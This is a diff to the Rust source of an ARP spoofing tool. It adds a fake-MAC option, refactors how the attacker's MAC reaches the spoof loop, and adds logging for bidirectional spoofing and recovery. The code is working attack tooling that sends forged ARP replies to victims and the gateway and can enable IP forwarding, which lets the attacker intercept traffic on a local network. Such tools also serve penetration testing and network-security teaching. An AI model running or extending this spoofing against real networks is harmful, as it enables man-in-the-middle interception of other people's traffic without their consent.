@@ -1,5 +1,8 @@
-use crate::{arp::{self, request_arp}, forward::{enable_ip_forward, get_ip_forward, set_ip_forward}};
 use crate::{args, arp::new_ether_channel};
+use crate::{
+    arp::{self, request_arp},
+    forward::{enable_ip_forward, get_ip_forward, set_ip_forward},
+};
 use ctrlc;
 use log::info;
 use pnet::{datalink::DataLinkSender, packet::Packet};
@@ -31,8 +34,13 @@ pub fn main_spoof(args: args::spoof::Arguments) -> Result<(), String> {
     let timeout = args.timeout;
 
     let my_addr = get_my_addrs(iface)?;
-    let attacker_addr =
-        get_attacker_addrs(iface, &my_addr, args.fake_ip, args.timeout)?;
+    let attacker_addr = get_attacker_addrs(
+        iface,
+        &my_addr,
+        args.fake_mac,
+        args.fake_ip,
+        args.timeout,
+    )?;
     let gw_addr = get_gw_addrs(iface, args.gw_ip, &my_addr, timeout)?;
 
     let mut victim_ips = args.victim_ips;
@@ -42,12 +50,10 @@ pub fn main_spoof(args: args::spoof::Arguments) -> Result<(), String> {
 
     let victims_addr = get_victims_addrs(
         iface,
-        & victim_ips.into_iter().collect(),
+        &victim_ips.into_iter().collect(),
         &my_addr,
         timeout,
     )?;
-
-
 
     let delay = args.delay;
 
@@ -58,7 +64,6 @@ pub fn main_spoof(args: args::spoof::Arguments) -> Result<(), String> {
         run_c.store(false, Ordering::SeqCst);
     })
     .expect("Error setting Ctrl-C handler");
-
 
     let old_forward_value = if args.forward {
         let fv = get_ip_forward()?;
@@ -72,7 +77,7 @@ pub fn main_spoof(args: args::spoof::Arguments) -> Result<(), String> {
         iface,
         &victims_addr,
         &gw_addr,
-        &attacker_addr,
+        attacker_addr.mac,
         delay,
         args.count,
         running,
@@ -105,23 +110,27 @@ fn get_my_addrs(iface: &NetworkInterface) -> Result<Addrs, String> {
 fn get_attacker_addrs(
     iface: &NetworkInterface,
     my_addr: &Addrs,
+    fake_mac: Option<MacAddr>,
     fake_ip: Option<Ipv4Addr>,
     timeout: Duration,
 ) -> Result<Addrs, String> {
-    Ok(match fake_ip {
-        Some(fake_ip) => {
-            let attacker_mac =
-                request_arp(&iface, fake_ip, my_addr.ip, my_addr.mac, timeout)
-                    .map_err(|e| {
-                        format!(
-                            "Unable to get MAC of attacker {}: {}",
-                            fake_ip, e
-                        )
-                    })?;
-            Addrs::new(fake_ip, attacker_mac)
-        }
-        None => Addrs::new(my_addr.ip, my_addr.mac),
-    })
+    if let Some(mac) = fake_mac {
+        info!("Using fake MAC {}", mac);
+        return Ok(Addrs::new(Ipv4Addr::UNSPECIFIED, mac));
+    }
+
+    if let Some(fake_ip) = fake_ip {
+        let attacker_mac =
+            request_arp(&iface, fake_ip, my_addr.ip, my_addr.mac, timeout)
+                .map_err(|e| {
+                    format!("Unable to get MAC of attacker {}: {}", fake_ip, e)
+                })?;
+        info!("Using MAC {} from IP {}", attacker_mac, fake_ip);
+        return Ok(Addrs::new(fake_ip, attacker_mac));
+    }
+
+    info!("Using my MAC {}", my_addr.mac);
+    return Ok(Addrs::new(my_addr.ip, my_addr.mac));
 }
 
 fn get_gw_addrs(
@@ -173,7 +182,7 @@ fn spoof(
     iface: &NetworkInterface,
     victims_addr: &Vec<Addrs>,
     gw_addr: &Addrs,
-    attacker_addr: &Addrs,
+    attacker_mac: MacAddr,
     delay: Duration,
     count: Option<u64>,
     running: Arc<AtomicBool>,
@@ -187,7 +196,7 @@ fn spoof(
         &mut sender,
         victims_addr,
         gw_addr,
-        attacker_addr,
+        attacker_mac,
         delay,
         count,
         running,
@@ -211,27 +220,17 @@ fn spoof_victims(
     sender: &mut Box<dyn DataLinkSender>,
     victims_addr: &Vec<Addrs>,
     gw_addr: &Addrs,
-    attacker_addr: &Addrs,
+    attacker_mac: MacAddr,
     delay: Duration,
     mut count: Option<u64>,
     running: Arc<AtomicBool>,
     bidirectional: bool,
 ) -> Result<(), String> {
     for victim_addr in victims_addr.iter() {
-        eprintln!(
-        "Spoofing - telling {} ({}) that {} is {} ({}) every {}.{} seconds ({})",
-        victim_addr.ip,
-        victim_addr.mac,
-        gw_addr.ip,
-        attacker_addr.mac,
-        attacker_addr.ip,
-        delay.as_secs() as f64,
-        delay.subsec_nanos() as f64 * 1e-9,
-        match count {
-            Some(c) => format!("{} times", c),
-            None => format!("until Ctrl-C")
+        print_spoof_info(victim_addr, gw_addr, attacker_mac, delay, count);
+        if bidirectional {
+            print_spoof_info(gw_addr, victim_addr, attacker_mac, delay, count);
         }
-    );
     }
     while running.load(Ordering::SeqCst) {
         count = match count {
@@ -250,7 +249,7 @@ fn spoof_victims(
                 victim_addr.ip,
                 victim_addr.mac,
                 gw_addr.ip,
-                attacker_addr.mac,
+                attacker_mac,
             )?;
             if bidirectional {
                 send_arp_reply(
@@ -258,7 +257,7 @@ fn spoof_victims(
                     gw_addr.ip,
                     gw_addr.mac,
                     victim_addr.ip,
-                    attacker_addr.mac,
+                    attacker_mac,
                 )?;
             }
         }
@@ -267,6 +266,28 @@ fn spoof_victims(
     }
 
     return Ok(());
+}
+
+fn print_spoof_info(
+    victim_addr: &Addrs,
+    gw_addr: &Addrs,
+    attacker_mac: MacAddr,
+    delay: Duration,
+    count: Option<u64>,
+) {
+    eprintln!(
+        "Spoofing - telling {} ({}) that {} is {} every {}.{} seconds ({})",
+        victim_addr.ip,
+        victim_addr.mac,
+        gw_addr.ip,
+        attacker_mac,
+        delay.as_secs() as f64,
+        delay.subsec_nanos() as f64 * 1e-9,
+        match count {
+            Some(c) => format!("{} times", c),
+            None => format!("until Ctrl-C"),
+        }
+    );
 }
 
 fn recover_victims(
@@ -281,6 +302,13 @@ fn recover_victims(
             "Readjusting {} for {} ({})",
             gw_addr.ip, victim_addr.ip, victim_addr.mac
         );
+
+        if bidirectional {
+            eprintln!(
+                "Readjusting {} for {} ({})",
+                victim_addr.ip, gw_addr.ip, gw_addr.mac
+            );
+        }
     }
     for _ in 0..5 {
         for victim_addr in victims_addr.iter() {
